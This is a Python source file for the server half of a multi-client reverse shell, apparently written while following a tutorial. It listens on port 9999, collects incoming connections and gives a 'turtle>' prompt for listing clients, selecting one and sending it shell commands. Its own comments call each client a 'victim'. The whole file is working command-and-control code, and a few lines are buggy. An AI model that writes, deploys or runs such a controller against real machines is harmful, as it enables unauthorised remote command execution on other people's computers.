import socket
import sys
import threading
import time
from queue import Queue

number_of_THREADS = 2
JON_NUMBER = [1,2]      # The jobs of the Threads which the first one is to Listen for connections and accept
                        # connections when any client is trying to connect and the job of the second thread is
                        # to send commands to the clients and handle connections with the existing clients

queue = Queue()
all_connections = []    # in any connection which is made we have two important feature 1- connection and 2-address
all_addresses = []
# Create a socket (connect two computers)
def create_socket():
    try:
        global host
        global port
        global s # s as socket
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("socket ctreation errror " + str(msg))


# Binding the socket and listening for the connections
def bind_socket():
    try:
        global host
        global port
        global s # s as socket

        print("binding the port: " + str(port))

        s.bind((host,port))   # host and port are known as tupil in python, so we are them in this way
        s.listen(5)  # server should continously listen for the connection from other sytems



    except socket.error as msg:
        print("socket creation error " + str(msg) + "\n" + "Retrying ... ")
        bind_socket()


# handling connection from multiple clients and saving to a list
# closing previous connections when server.py is restarted
def accepting_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_addresses[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # prevent timeout from happening

            all_connections.append(conn)
            all_addresses.append(address)

            print("Connection has been established " + address[0])
        except:
            print("error accepting connection")


# 2nd thread function - 1) See all the clients 2) Select a client 3)Send commands to the connected client
# Interactive prompt for sending commands
# turtle> list
# 0 Friend-A Port
# 1 Friend-B Port
# 2 Friend-C Port
# turtle> select 1

def start_turtle():
    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognized")

# Display all current active connections with the client
def list_connections():
    results = ''
    selectID = 0
    for i,conn in enumerate(all_connections): # in eah loop the value of the i will be added to 1 with the use of enumerate
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue


        results = str(i) + '       ' + str(all_addresses[i][0]) + '             ' + str(all_addresses[i][1]) + '\n'
    print("---- Clients------"+'\n'+results)

#selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')    #target=id
        target = int(target)
        conn = all_connections[target]
        print('You are now connected to: ' + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]+ '>', end=""))
        return  conn
        #192.168.0.4>
    except:
        print('Selection not valid')
        return None


# send commandS from our computer (server) to the client/victim's computer
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:         # the command formats are in bytes, so we use the encode to convert it
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")   #we change the format of the received data from bytes to string and 1024 is for save it completely
                print(client_response, end="")   # the end="" is to finalize the line and go to the next line
        except:
            print('Error Sending commands')
            break

# create worker threads
def create_workers():
    for _ in range(number_of_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()

        queue.task_done()



def create_jobs():
    for x in JON_NUMBER:
        queue.put(x)
    queue.join()


create_workers()
create_jobs()
















# a function for accepting the connection
# Establish connection with a client ans the socket must be listening
# def socket_accept():
#     conn, address = s.accept()    # this gives us two very important data in return: 1- an object of the connection and
#                                   # 2- a list of ip address and the port
#     print("Connection has been established" + "IP" + address[0], "| Port" + str(address[1]))
#     send_commands(conn)
#     conn.close()
#
# # send commandS from our computer (server) to the client/victim's computer
# def send_commands(conn):
#     while True:
#         cmd = input()
#         if cmd == 'quit':
#             conn.close()
#             s.close()
#             sys.exit()
#         if len(str.encode(cmd))>0:         # the command formats are in bytes, so we use the encode to convert it
#             conn.send(str.encode(cmd))
#             client_response = str(conn.recv(1024), "utf-8")   #we change the format of the received data from bytes to string and 1024 is for save it completely
#             print(client_response, end="")   # the end="" is to finalize the line and go to the next line
#
#
# def main():
#     create_socket()
#     bind_socket()
#     socket_accept()
#
#
# main()
